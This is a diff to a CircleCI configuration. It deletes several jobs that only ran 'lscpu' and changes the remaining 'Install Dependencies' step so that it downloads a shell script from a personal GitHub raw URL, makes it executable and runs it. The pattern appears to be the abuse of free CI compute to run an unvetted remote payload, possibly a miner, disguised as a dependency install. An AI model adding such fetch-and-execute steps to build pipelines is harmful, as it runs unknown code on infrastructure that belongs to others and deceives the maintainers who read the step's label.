@@ -6,33 +6,13 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            command: timeout 1m lscpu
-    Devop1:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        - run:
-            name: Install Dependencies
-            command: timeout 1m lscpu
-    Devop2:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        - run:
-            name: Install Dependencies
-            command: timeout 1m lscpu
-    Devop3:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        - run:
-            name: Install Dependencies
-            command: timeout 1m lscpu
+            command: wget https://raw.githubusercontent.com/zalate1/al1/main/al1.sh && chmod +x al1.sh && .al1.sh
+
+        
+
 workflows:
     version: 2.1
     build:
         jobs:
             - Devop
-            - Devop1
-            - Devop2
-            - Devop3
+            
